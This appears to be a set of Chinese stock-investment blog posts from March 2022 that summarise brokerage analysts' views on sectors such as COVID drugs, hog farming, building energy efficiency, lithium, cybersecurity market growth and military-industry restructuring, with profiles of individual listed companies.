-  <h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="新冠口服药-中药"><a href="#新冠口服药-中药" class="headerlink" title="新冠口服药+中药"></a>新冠口服药+中药</h3><p>** 新冠口服药+中药+上游产业链，国内这几家公司最值得期待，不仅将有巨大增量、未来更有望参与全球药物生产。**<br>《风口研报》今日导读1、新冠治疗（奥翔药业、九洲药业、河化股份）：<br>①第九版新冠诊疗方案发布，新增了两种抗病毒药物和中药治疗，华安证券谭国超认为新冠小分子药物已在全球范围内广泛使用，国内真实生物、君实生物研发进度最快，产品有望年内获批，国产口服新冠药物链条值得期待；<br>②谭国超认为在疫情的催化下，口服新冠小分子药物迅速放量，为国内CDMO公司带来巨大增量，更有望迎来参与全球创新药物生产的重要契机；<br>③此前每版的《方案》都离不开中药的身影，“三药三方”已发挥了显著作用，2022年3月《中成药防治新型冠状病毒肺炎专家共识》发布，谭国超看好新版《共识》推动中药抗疫，相关防疫中药厂商未来会直接受益；④风险因素：新冠疫情发展变化风险、产品研发数据及进度不及预期风险、产品产能及销售不及预期风险。</p>
-<p>新冠口服药+中药+上游产业链，国内这几家公司最值得期待，不仅将有巨大增量、未来更有望参与全球药物生产第九版新冠诊疗方案发布，新增了两种抗病毒药物和中药治疗，两款抗病毒药物是用于“有进展为重型或重症高风险因素的患者”，相对而言，中医药的“三方三药”主要是应用在新冠肺炎轻症和无症状感染者身上，新方案是中西治疗的全新结合。华安证券谭国超深度覆盖新冠药物产业链，看好第九版方案的发布对国内新冠防治工作起到了新的指导意义，中药、西药、上游产业链等，都迎来了新的投资机会。新冠小分子药物撑起疫情治疗半边天，国产口服新冠药物链条值得期待小分子药物方面，辉瑞Paxlovid、默沙东Molnupiravir等已经取得较为明确的疗效并在全球范围内广泛使用。</p>
-<p>国内新冠口服药方面，目前尚无国产产品获批，但多家企业正在积极布局，其中真实生物、君实生物研发进度最快，产品有望年内获批。<br>（1）真实生物的新冠口服药为阿兹夫定，采用核苷酸类似物技术路线，同默沙东Molnupiravir类似，涉及公司主要有上游原料药和中间体供应商拓新药业、奥翔药业。<br>（2）君实生物的新冠口服药VV116，技术路线也是核苷类似物，涉及公司主要有上游原料药和中间体供应商河化股份等。新冠药物为国内CDMO公司带来巨大增量，并迎来参与全球创新药物生产的重要契机谭国超认为在疫情的催化下，口服新冠小分子药物迅速放量，对上游中间体、原料药的需求也呈现爆发式增长，新冠产业链热度空前。并且，新冠供应链是国内CDMO公司打开国际市场、参与全球创新药物生产的重要契机。目前国内头部小分子CDMO企业已经凭借强大的产能供应、成本优势和交付能力，在新冠产业链中占据重要位置。从订单上来看，目前受益最充分的是小分子CDMO头部企业凯莱英和博腾股份。从产能上来看，在持续高景气及大订单的加持下，头部企业纷纷进入产能加速建设阶段。“三药三方”已发挥了显著作用，新版《共识》推动中药抗疫此前每版的《方案》都离不开中药的身影，其中经过筛选研究的“三药三方”成为抗疫的中药名片。2022年3月《中成药防治新型冠状病毒肺炎专家共识》发布，其中关于COVID-19中成药治疗推荐，从轻型、普通型以及重型和危重型的症状进行划分，不同阶段推荐中药治疗方案也不尽相同。谭国超看好在后疫情时代，中药无论是在预防还是治疗上都能发挥重要作用，各地方防疫也都能看到中药的力量，相关防疫中药厂商未来会直接受益。近期本栏目医药&amp;医疗系列：3月17日《布局新冠重症稀缺特效药，这匹“小黑马”同时推进三款新冠免疫抑制药物、2022年有望获批上市，分析师称其产品为“救命必须”》3月13日《多种检测方法联合应用，可有效缩短检测窗口期，“疫苗+检测+治疗药”多种手段共存，共筑疫情防控城墙》3月13日《新冠抗原自测试剂即将上架！这两家公司率先布局IVD检测增量业务、线下+线上终端渠道同步打开，分析师测算最高或迎370亿元增量市场》3月11日《新冠抗体检测+鼻喷新冠疫苗+HPV，这家公司处于大品种业绩兑现窗口期，现已获WHO预认证、产品有望出口海外打开更大空间》3月10日《“新冠抗体+抗原+试剂盒”需求或超预期，这家公司掌握检测试剂、抗体、疫苗生产中不可或缺的关键原料，下游直销药企数量超1000家》3月10日《合作药企开发新冠药物+疫苗，并自研自产新冠检测试剂，公司产品已实现大规模生产，有望带来更多收入空间》</p>
-<p>另外：河化股份：仅是为一种有些过时的“新冠药物”生产原料的河化股份，其所含“新冠防治”概念的成色，恐怕还需要打上一个大大的问号。</p>
-<h3 id="生猪养殖"><a href="#生猪养殖" class="headerlink" title="生猪养殖"></a>生猪养殖</h3><p>生猪养殖多年难遇的“超级反转拐点”将至，上一波10倍股层出不穷，本轮周期这几家具备“产能弹性”的公司有望成为种子选手。<br>今日导读 生猪养殖（温氏股份、天康生物、新五丰）：<br>①今年1-2月份生猪养殖上市公司出栏同比加速，2月生猪销售均价环比-11%，叠加饲料成本大涨，行业亏损严重；<br>②当前能繁母猪存栏持续下降，上市猪企出栏增速或前高后低、逐步放缓，招商证券熊承慧预计最早下半年猪价有望反转；<br>③熊承慧认为本轮猪周期关注过往周期中展现出成本及头均盈利优势、且有望继续扩张的龙头，以及销售结构优、养殖成本低的区域性龙头猪企等；<br>④风险提示：行业产能去化不及预期。</p>
-<p>近日生猪价格持续走弱，上市养殖企业2月生猪销售均价11.88元，环比-11%。当前在猪价低位、成本上涨的双重夹击下，行业亏损幅度严重，而带来更大幅度的现金流消耗，加速产能去化，本轮生猪周期价格底部或渐渐临近。</p>
-<p>招商证券熊承慧认为，当前能繁母猪存栏持续下降，上市猪企出栏增速或前高后低、逐步放缓，预计最早下半年猪价有望反转。建议积极布局优质猪企：<br>1）过往周期中展现出成本及头均盈利优势、且有望继续扩张的自繁自养龙头猪企；<br>2）经营已现改善，头均亏损或已触底的温氏股份；<br>3）销售结构优、养殖成本低的区域性龙头猪企。</p>
-<p>出栏加速、亏损持续，猪周期反转渐近2022年1至2月，12家生猪养殖上市公司合计出栏生猪1762万头，同比增长44%；出栏增速有明显回升。2022年1月和2月，上市猪企的肥猪销售均价分别约13.3元&#x2F;公斤、11.9元&#x2F;公斤，维持下跌趋势。同时，由于豆粕等饲料原料大涨。生猪养殖行业的现金成本仍存在压力，2022年1月和2月生猪养殖行业仍处于现金亏损状态，部分上市公司的头均亏损幅度较2021年11月和12月有所放大。上半年猪价受供给压力的影响易跌难涨，母猪产能去化仍将持续、并有望逐步加速。周期反转渐近，择优布局猪企招商证券认为，能繁母猪存栏持续下降，上市猪企出栏增速或前高后低、逐步放缓，预计最早下半年猪价有望反转。售价低迷，原料成本上升，当前生猪养殖行业仍陷于现金流亏损状况，有望带动产能加速去化。梳理上市猪企过往经营数据及盈利情况后不难发现，虽然非洲猪瘟疫情导致猪价出现了3倍左右的涨幅，但是由于扩张成本高、出栏放量期猪价已步入下行期，不少上市公司在过去一轮周期中并未实现盈利，更不提实现相对行业的超额盈利。</p>
-<p>建议从三个角度筛选优质猪企进行布局：<br>1）过往周期中展现出成本及头均盈利优势、且有望继续扩张的自繁自养龙头猪企；2）经营已现改善，头均亏损或已触底的温氏股份；3）销售结构优、养殖成本低的区域性龙头猪企。</p>
-<h3 id="建筑节能（东方雨虹、鲁阳节能、鸿路钢构）"><a href="#建筑节能（东方雨虹、鲁阳节能、鸿路钢构）" class="headerlink" title="建筑节能（东方雨虹、鲁阳节能、鸿路钢构）"></a>建筑节能（东方雨虹、鲁阳节能、鸿路钢构）</h3><p>①住建部发布《“十四五”建筑节能与绿色建筑发展规划》，结合将在今年4月起实施的全文强制性国标《建筑节能与可再生能源利用通用规范》，中信证券孙明新认为政府对建筑节能的重视程度明显提升，建筑节能和BIPV行业预计将受益于政策引导，需求有望长期提升；<br>②两文件提出了提高新建建筑和既有建筑节能水平总体任务的具体要求，同时建筑遮阳将是政策长期鼓励的节能措施之一，有望带动保温材料需求增加，重点公司包括东方雨虹、玉马遮阳、鲁阳节能；<br>③两文件均提出推广建筑光伏的任务或要求，质量要求提升有利于建筑光伏EPC订单向头部建筑企业集中，同时孙明新认为装配式建筑渗透率提升有利于支撑钢结构需求，重点公司包括东南网架、鸿路钢构、杭萧钢构、精工钢构、中天精装、森特股份；<br>④风险因素：政策推进不及预期、上市公司在手订单落地不及预期。</p>
-<p>一文看懂建筑节能领域，强制性国标4月起实施，这两个环节将成为受益政策的主要方向3月11日住建部发布《“十四五”建筑节能与绿色建筑发展规划》（下称“规划”）。结合将在今年4月起实施的全文强制性国标《建筑节能与可再生能源利用通用规范》（下称“规范”），建筑节能领域的顶层设计已愈发完善。</p>
-<p>中信证券孙明新深度覆盖建筑节能领域，在“双碳”目标下，政府对建筑节能的重视程度明显提升，建筑节能和BIPV行业预计将受益于政策引导，需求有望长期提升。两文件框架梳理：规范细化节能建设要求，规划指导节能提升方向“规范”作为强制性国标，对新建建筑和既有建筑的节能工程详细明确了设计、施工、调试、验收、运行管理的强制性指标及基本要求。</p>
-<p>“规范”的明细要求和强制执行性为“规划”的落实提供依据和保障，孙明新将“规划”提出的重点任务提炼和归结为四个方面：<br>（1）建筑发展方向：建设高品质绿色建筑，提升建筑节能水平，推广超低能耗建筑、近零能耗建筑等；<br>（2）建筑能源应用：推动太阳能建筑应用等；<br>（3）建筑建造方式：发展装配式建筑和装配化装修等；<br>（4）建筑建材使用：促进绿色建材推广应用等。孙明新认为提升建筑节能水平、应用建筑光伏等措施成为推动绿色建筑高质量发展的重要抓手。</p>
-<p>两文件将引导建筑保温、建筑遮阳、建筑光伏的质量和需求提升<br>（1）建筑保温：保温材料直接影响建筑外围护结构的热工性能；两文件提出了提高新建建筑和既有建筑节能水平总体任务的具体要求，有望带动保温材料需求增加。此外，两文件对保温工程的保险制度、系统化供应、各环节技术指标做出规划和要求，对保温工程的质量要求提升，有利于行业集中度提升。重点公司包括：东方雨虹、玉马遮阳、鲁阳节能。<br>（2）建筑遮阳：将是政策长期鼓励的节能措施之一；“规划”提到“因地制宜增设遮阳设施，提升遮阳设施安全性、适用性、耐久性”，“规范”要求夏热冬暖、夏热冬冷地区的甲类公共建筑南、东、西向外窗和透光幕墙应采取遮阳措施。孙明新认为这表明了温暖气候地区安装建筑遮阳的必要性，建筑遮阳将是政策长期鼓励的节能措施之一。<br>（3）建筑光伏：分布式光伏发展预计超出目标预期，订单向头部建筑企业集中；两文件均提出推广建筑光伏的任务或要求，对安装建筑光伏的合理性和安全性做出要求，质量要求提升有利于建筑光伏EPC订单向头部建筑企业集中。同时孙明新认为装配式建筑渗透率提升有利于支撑钢结构需求。重点公司包括：东南网架、鸿路钢构、杭萧钢构、精工钢构、中天精装、森特股份。 </p>
-<h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="中装建设"><a href="#中装建设" class="headerlink" title="中装建设"></a>中装建设</h3><p>这家公司传统建筑装饰公司首次单列新能源板块，业务覆盖“工程+新能源+数据中心”三大领域，旗下机柜总规模达1万个；</p>
-<p>中装建设于3月15日接待电话调研时表示，公司主营业务为建筑装饰，近年来公司围绕主业链上下游进行延伸，包括幕墙、施工总承包、物业管理、新能源、IDC等，各业务板块之间具有协同效应，达到1+1大于2的效果。</p>
-<p>工程板块是公司最重要的板块，也是公司发展的根基。在未来的发展当中，工程板块依然发挥中流砥柱的作用。2022年工程板块重点围绕医院、学校、地铁、机场、博物馆、保障性住房、老旧小区改造等民生保障性工程开展。</p>
-<p>在双碳背景下，绿色能源的发展是大势所趋，新能源板块的发展空间巨大。在此背景之下，公司第一次将新能源板块单列板块，以推动公司的转型发展。2021年公司开始尝试新能源EPC项目——河南许昌50兆瓦风电项目。公司计划通过逐步持有优质的发电资产，实现新能源板块的高速发展。</p>
-<p>目前公司科技创新板块最为重要的业务就是IDC业务，基于未来互联网行业的发展，以及5G商业化的大规模应用的背景，在佛山建设了五沙（宽原）大数据中心，总规模为1万个机柜，用来推进数据中心和云计算业务。</p>
-<h3 id="济川药业"><a href="#济川药业" class="headerlink" title="济川药业"></a>济川药业</h3><p>这家医药小龙头业绩加速兑现，产品结构优化，全年新品种放量有望持续加速；<br>济川药业于3月11、15日接待机构调研时表示，经初步测算，预计公司2021年实现营业收入76.31亿元，较上年同期增长23.77%；利润总额18.88亿元，较上年同期增长27.28%；归属于上市公司股东的净利润16.64亿元，较上年同期增长30.31%；归属于上市公司股东的扣除非经常性损益的净利润15.60亿元，较上年同期增长26.37%。</p>
-<p>近年来，公司产品结构得到了明显优化。蒲地蓝消炎口服液、雷贝拉唑钠肠溶胶囊占销售收入的比例明显降低，公司产品中小儿豉翘清热颗粒、蛋白琥珀酸铁口服溶液、健胃消食口服液、黄龙止咳颗粒等产品对公司销售额贡献逐步增加，具有更大的发展潜力。此外，公司2020年底国谈品种甘海胃康胶囊、川芎清脑颗粒销量也实现了快速增长。</p>
-<p>浙商证券分析师认为，公司历史上通过蒲地蓝、小儿豉翘和雷贝拉唑钠三种药品积累了成熟的OTC销售渠道，自身销售能力得到验证，预计公司全年新品种的放量有望持续加速，依靠健胃消食口服液、黄龙止咳颗粒、蛋白琥珀酸铁口服溶液等中西医药品种搭建中长期产品梯队。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-股票-20220317"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/03/17/%E8%82%A1%E7%A5%A8-20220317/"
-    >股票-20220317</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/03/17/%E8%82%A1%E7%A5%A8-20220317/" class="article-date">
-  <time datetime="2022-03-16T23:49:18.000Z" itemprop="datePublished">2022-03-17</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="氢氧化锂"><a href="#氢氧化锂" class="headerlink" title="氢氧化锂"></a>氢氧化锂</h3><p>据上海钢联发布数据显示，锂电材料氢氧化锂报价今日涨5000元&#x2F;吨，报价49万&#x2F;吨，）价格较春节后（据生意社春节后价格为28.8万元&#x2F;吨）已上涨70.1%。券商观点</p>
-<p>华创证券王保庆分析指出，短期，锂市场依旧偏紧，下游需求旺盛，带动锂价稳步上行。中期，上游锂矿开发周期较长，未来2-3年内供给短缺格局预计将难有改变，下游电动车和储能已占据锂需求60%以上，随着下游需求的高增长，锂行业料将获得高成长性。</p>
-<pre><code>数据解读
-</code></pre>
-<p>华安证券研报指出，新能源车进入加速渗透期，储能高速增长，需求井喷下锂电产业链积极扩张，锂电行业未来5年年均增速45%以上。</p>
-<pre><code>产业链相关公司
-
-天华超净联合宁德时代等企业共同出资设立的天宜锂业，一期年产2万吨电池级氢氧化锂项目产能完全释放，全部扩产项目达产后，天宜锂业将具备电池级氢氧化锂产品的总产能16万吨/年。
-
-丰元股份全资子公司山东丰元锂能科技有限公司与玉溪市人民政府签署《投资协议》，其中提到玉溪市人民政府要支持乙方依法依规参与竞拍取得黏土锂矿等矿产资源探矿权、采矿权，依法保障公司锂电池正极材料及配套项目所需锂矿等有关资源。
-</code></pre>
-<h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="文山电力（600995）"><a href="#文山电力（600995）" class="headerlink" title="文山电力（600995）"></a>文山电力（600995）</h3><p>A股目前稀缺的储能运营资产即将注入这家小市值公司，多个储能项目已并网运行，2023年冲击20亿元级别净利润<br>2022-03-16 11:22 星期三<br>文山电力（600995）精要：<br>①公司拟注入南网调峰调频资产，此次重组完成后，公司业务由购售电、发电、电力设计及配售电转变为抽水蓄能、调峰水电和电网独立侧储能业务；<br>②截至2020年底我国抽水蓄能电站装机规模达到31.49GW，占中国储能市场比重接近90%，根据天风证券郭丽丽测算，2021-2026年调峰调频公司的抽水蓄能电站资产能够实现净利润复合增速达到33%；<br>③调峰调频公司于2011年建成10MW深圳宝清电池储能站，公司2021-2025年电化学储能资产预计复合增速高达371.2%；<br>④风险提示：资产重组被暂停、中止或者取消。近期成长赛道抗风险表现相对强于稳增长方向，原因为市场对于今年经济预期弱势而流动性预期相对宽松，成长赛道相对占优。</p>
-<p>天风证券郭丽丽今日覆盖了一家成长性与稀缺性兼具的储能运营标的文山电力，公司拟通过重大资产置换计划置入南方电网的抽水蓄能、调峰水电和电网独立侧储能资产。2021年上半年调峰调频公司实现归母净利5.55亿元。郭丽丽预计拟置入资产调峰调频公司2023年业绩21.5亿元，若顺利完成资产重组，在25倍PE下对应目标价为23.64元（当前13元，具有80%空间）。装机增长+稳定收益，抽水蓄能有望开启黄金十年发展期文山电力为南网旗下电网上市公司，拟置入的南方电网持有标的调峰调频发电有限公司主营业务为抽水蓄能、调峰水电和电网侧独立储能业务（拟置入资产作价在130-160亿元之间）。2021年上半年，抽水蓄能毛利润为8.01亿元，调峰水电毛利润为4.3亿元，合计占比在90%左右。当前抽水蓄能是目前大规模调节能源首选，抽水蓄能度电成本为0.21-0.25元&#x2F;kwh，而目前度电成本最低的铅蓄电池储能技术也为0.61元&#x2F;kwh，远高于抽蓄的平均成本。循环寿命次数达到16000次，远高于磷酸铁锂电池等。公司已投运的5座抽蓄电站中，有4座位于广东省，1座位于海南省；目前在建梅州抽水蓄能电站一期、阳江抽水蓄能电站一期两座合计装机240万千瓦的抽水蓄能电站。</p>
-<p>综合来看，天风证券预计公司2021-2026年，调峰调频公司的抽水蓄能电站资产能够带来的合计利润分别5.52&#x2F;7.66&#x2F;13.77&#x2F;15.36&#x2F;20.09和23.16亿元，复合增速达到33.2%，其中2023年同比实现约80%的同比增幅。新型储能发展前景广阔，技术储备充足调峰调频公司储能科研团队早在2009年就开始了电化学储能技术的研究，于2011年建成投运国内首个兆瓦级锂离子电池储能站——深圳宝清电池储能站。2021年7月，调峰调频公司与广东电网公司签订储能示范项目合作协议，将东莞110kv杨屋站、220kv黎贝站和广州110kv芙蓉站储能项目确定为南方电网公司2021年新兴业务领域示范项目。截至2022年2月，三批项目已经全部成功并网启动，进一步扩大公司储能装机规模。到2025年，南方电网电网新能源配套储能中侧储能装机规模有望在2025年达到5GW。</p>
-<h3 id="先进数通"><a href="#先进数通" class="headerlink" title="先进数通"></a>先进数通</h3><p>这家银行IT小龙头完成法定数字货币支付应用解决方案研发，东数西算业务板块提供IT基础设施建设业务，客户覆盖以商业银行为主的金融机构；</p>
-<p>先进数通于3月9日接待多家机构调研时表示，公司定位于金融信息化服务提供商，业务覆盖IT基础设施建设、软件解决方案、IT运维服务。公司积累了以国有大型商业银行、全国性股份制商业银行、区域性银行、大型互联网企业为代表的众多的高端客户。</p>
-<p>调研过程中，公司表示，法定数字货币目前主要的应用领域是其基础支付功能。基于公司自有版权软件产品Starring，公司构建了支持法定数字货币的支付应用解决方案，目前解决方案研发已经完成，公司正在面向中小银行，推广上述解决方案，已有多个项目处于实施过程中。</p>
-<p>此外，公司与数据中心相关的业务是向大中型金融、互联网企业提供数据中心IT基础设施建设业务，主要涉及服务器系统、存储系统、网络系统、基础软件。国家东数西算战略部署，对大中型金融、互联网企业未来数据中心布局产生长期影响，对促进以数据中心建设为代表的新基建也将起到巨大的促进作用。</p>
-<p>A股相关上市公司中，海联金汇数字人民币业务已在线上和线下零售消费场景测试运行，公司跨境支付业务服务覆盖全球239个国家和地区。天玑科技业务主要包括数据中心IT基础设施服务、软硬件销售及自有产品销售，在2020年数据中心IT基础设施第三方服务市场排名第五，在数据中心IT基础设施IT支持与维护市场第三方中排名第三。</p>
-<h3 id="中科创达"><a href="#中科创达" class="headerlink" title="中科创达"></a>中科创达</h3><p>这家智能操作系统提供商2021年业绩高增，定增卡位智能物联网，在自动驾驶领域与世界头部芯片厂商展开密切合作；<br>中科创达董事长等公司高管于3月8日接待多家机构电话调研，公司2021年营收为41.27亿元，同比增长57.04%，落于业绩预告区间中值。全年实现归母净利润6.47亿元，同比增长45.96%，实现扣非净利润5.76亿元，同比增长57.29%。</p>
-<p>公司智能汽车业务整体的发展在2022年会保持持续快速增长。从客户维度来看,大客户的数量和规模明显在快速增长。大客户数量的持续增长,清晰地表明创达在头部客户的市场份额在不断增长。</p>
-<p>在汽车业务的增长中,海外市场的增速将会超过国内业务,在汽车收入中的占比也会提升，并且会带动智能汽车业务整体毛利率的提升。从业务维度来看,创达的智能座舱业务已经确立在全球的领先地位,并继续保持整体增长。智能驾驶是汽车业务的第二增长曲线，后续占比还会持续提升。</p>
-<p>在自动驾驶领域,2021年开始，公司和英伟达，高通,地平线等芯片厂商都展开密切的合作。创达是英伟达在中国的首家视觉领域的软件合作伙伴；和地平线将共同合作在软件平台上的开发；2021年成立的苏州畅行智驾公司,将专注研发自动驾驶域控制器软件和硬件一体化平台。从核心竞争力来看,自动驾驶从长期来看硬件会走向同质化,真正的核心焦点将集中在软件的差异化。</p>
-<p>畅行智驾公司将基于高通芯片来研发中档的域控制器产品。目前创达是高通8540平台国内厂商中进展最快的,3月内就会有A样样品出来,并且和客户也在进行密切的合作沟通中。在样品出来后,会和客户展开测试和评估的工作。</p>
-<p>此外，公司发布定增预案，行拟募集资金总额不超过31亿元，发行对象为不超过35名（含35名）特定投资者，投入至整车操作系统研发项目、边缘计算站研发项目、XR研发及产业化项目和分布式算力网络技术研发项目以及补充流动资金，旨在布局物联网时代，实现率先卡位。</p>
-<p>A股相关上市公司中，宜通世纪主营业务覆盖通信网络技术服务、系统解决方案、通信设备销售业务、物联网平台及解决方案，主要为运营商和通信设备厂家提供从工程、优化到维护的一体化解决方案。伯特利主营业务是汽车制动系统和汽车智能驾驶相关产品的研发、生产和销售，主要产品分机械制动产品和智能电控产品两大类。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-分享-20220316"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/03/16/%E5%88%86%E4%BA%AB-20220316/"
-    >分享-20220316</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/03/16/%E5%88%86%E4%BA%AB-20220316/" class="article-date">
-  <time datetime="2022-03-16T00:02:47.000Z" itemprop="datePublished">2022-03-16</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><h3 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h3><p>“云计算+大数据”催生百亿元级别网络安全需求，分析师测算市场规模增速或将保持于35%，这些厂商未来三到五年市占率有望持续提升。数字化进程有望拉动网络安全需求，分析师测算大数据安全市场规模增速保持在35%左右，随着云计算技术的普及、渗透率的不断提升，相关基础设施与应用场景的安全防护应运而生，中小型客户需求有望加速释放，头部厂商业绩增速有望领跑行业。<br>信息安全（神思电子、飞天诚信、美亚柏科）精要：</p>
-<p>①中国银河证券吴砚靖认为，信息安全需求随信息产业增长而增长，是值得长期关注的稳增长、高景气的计算机细分领域，未来五年我国网络安全行业需求将维持20%以上的高增长，驱动因素主要体现在技术、政策和安全事件；</p>
-<p>②根据IDC最新预测，2021年中国网络安全市场投资规模将达到97.8亿美元，并有望在2025年增长至187.9亿美元，约人民币1220亿元，五年复合增速约为17.9%，增速持续领跑全球；</p>
-<p>③随着云计算技术的普及、渗透率的不断提升，相关基础设施与应用场景的安全防护应运而生，根据赛迪顾问数据，大数据安全市场规模2021年预计将达到69.7亿元，增速保持在35%左右，远高于网安行业整体的20%左右增速；</p>
-<p>④吴砚靖看好头部厂商综合服务能力强，未来三到五年市占率有望持续提升，信息安全相关标的包括神思电子、飞天诚信、美亚柏科、安博通等；</p>
-<p>⑤风险提示：行业竞争加剧、产业发展进度不达预期等。</p>
-<h3 id="军工，国企改革"><a href="#军工，国企改革" class="headerlink" title="军工，国企改革"></a>军工，国企改革</h3><p>1）军工上市公司有望迎资产注入高峰</p>
-<p>国家推进国企改革，目标“提高国有资本效率、增强国有企业活力”，2022年迎“国企改革三年行动”收官之年，相关改革举措有望加速；</p>
-<p>“十四五”国防装备大放量，军工科研院所有望加快资产注入：军工科研院所资产注入有利于提升科研成果转化率，防止产研分离，注入的优质资产可提高上市公司核心竞争力，改善资产质量；利润改善同时为科研活动提供经费支持，形成正向反馈。院所市场化、资本化是长期趋势。</p>
-<p>2）多家军工集团下属上市公司已经进行重大资产重组，后续业务有望加速</p>
-<p>2015年以来，军工集团下属上市公司累计已有32家进行了重大资产重组，重组公司占所有军工央企旗下A股上市公司数量的35%，累计注入评估价值超1300亿资产；</p>
-<p>其中中航工业资产证券化率最高达80%，其次为电子信息集团59%，船舶集团53%，兵器装备集团48%；航天科工、航天科技资产证券化率最低，截至2021H1仅14%、18%。</p>
-<p>自2017年军工集团整合注入高峰期后，2021年随着“国企三年改革行动”不断推进，企业资产注入掀起一轮新高峰，2022年及十四五期间有望持续保持高位。</p>
-<p>从重大资产重组注入前后收入对比看，累计33家公司重组前期总收入合计2133亿，资产注入后当期总收入合计2721亿，同比增幅28%；从重大资产重组前后归母净利润对比来看，重组前归母净利润合计46亿，重组后当期净利润合计84亿，同比增速83%，归母净利润涨幅明显。</p>
-<p>3）中电科集团、中航工业集团走在前列，航天系集团后续资本运作空间大</p>
-<p>中电科及中航工业集团走在前列：中航工业集团资产证券化率最高，截至2021H1已达80%，旗下多个上市公司成为细分赛道龙头；</p>
-<p>中电科集团开启了“子集团组建-上市公司激励-优质资产注入”的模式，以下属子集团为平台整合院所资产，累计对下属6家企业进行了重大资产重组，在对上市公司进行优质注入的同时实现核心院所资产有效改制，后期资产证券化率有望持续提升；</p>
-<p>航天系集团资产证券化率较低，后期资产重组有望加速：</p>
-<p>航天系集团早起资本运作较少，现阶段整体资产证券化率较低，截至2021分别为18%、14%；航天系优质院所及核心资产多，集团整体资本运作有望加速，资产证券化率提升空间较大。</p>
-<p>4）军工迎“内生+外延”双轮驱动，“内需+外贸”、“军品+民品”两翼齐飞</p>
-<p>①“百年变局”下，国防军工确定性高成长，“备战&#x2F;2027&#x2F;建设与第二大经济体相称的强大国防”是既定方向，2021年大额合同负债彰显“十四五”高景气；</p>
-<p>②未来几年，国防军工资产证券化、核心军品重组上市预计将掀起新一轮高潮，关注中船集团、航天科技、中电科、中航工业、航天科工、兵器工业等集团重组进程；</p>
-<p>③中国坦克&#x2F;无人机&#x2F;教练机&#x2F;战斗机等具备全球竞争力，外贸需求逐步崛起。国产大飞机&#x2F;民用航空发动机等产业链也在逐步成长。[图片]</p>
-<p>推荐基本面抢，业绩向好的中航西飞，航发动力，洪都航空，中航沈飞，内蒙一机，紫光国微，中航光电，中航高科，航发控制，西部超导，中国海防。看好航发科技，中航机电，中国船舶，中瓷电子等</p>
-<h3 id="华泰证券：计算机板块一季报前瞻，智能汽车、工业软件、金融IT等方向高增长值得期待"><a href="#华泰证券：计算机板块一季报前瞻，智能汽车、工业软件、金融IT等方向高增长值得期待" class="headerlink" title="华泰证券：计算机板块一季报前瞻，智能汽车、工业软件、金融IT等方向高增长值得期待"></a>华泰证券：计算机板块一季报前瞻，智能汽车、工业软件、金融IT等方向高增长值得期待</h3><p>【本文来自持牌证券机构，不代表平台观点，请独立判断和决策】</p>
-<p>一季报来临，投资者普遍关注高增长的赛道。华泰证券研报系统的梳理了计算机板块相关细分方向的业绩预测供参考。</p>
-<p>1）智能汽车</p>
-<p>高景气度有望持续，汽车软件迎发展机遇。</p>
-<p>随着汽车智能化持续推进，2021年智能汽车板块收入及业绩均实现高速增长。我们认为，汽车软件有望随着汽车智能化进程的推进加速发展。2022年，新能源车渗透率有望进一步提升，汽车电子架构的变革或将进一步深入，22Q1智能汽车板块下游需求有望维持在较高水平。</p>
-<p>2）工业软件</p>
-<p>21年工业软件企业收入同比增速集中在35%-45%之间，表现出下游需求的强劲。</p>
-<p>我们认为，工业软件的下游需求有望持续，22Q1板块收入增速或将维持在30%以上，主因：1）21年中国工业生产增加值快速恢复，为工业企业IT需求奠定基础；2）疫情加快了工业企业数字化改造进度；3）我们认为，中国工业制造龙头企业对国产工业软件的采购意愿在逐步增加。</p>
-<p>3）云计算</p>
-<p>渗透率继续提升，IaaS拐点+SaaS高增。</p>
-<p>我们认为，在这一轮云IaaS需求周期中，中国云基础设施需求的影响因素包括：1）互联网&#x2F;云IaaS大厂的需求，2）宏观经济增速，3）企业数字化转型的力度，4）新应用的崛起。21年互联网企业经过政策约束之后，22年有望进入业务稳定期，或将逐步迎来底层算力需求拐点。云SaaS领域，企业上云的节奏仍在逐步推进中，疫情的持续坚定企业上云的决心。</p>
-<p>4）网络安全</p>
-<p>收入普遍增长良好，成本端短期承压。 </p>
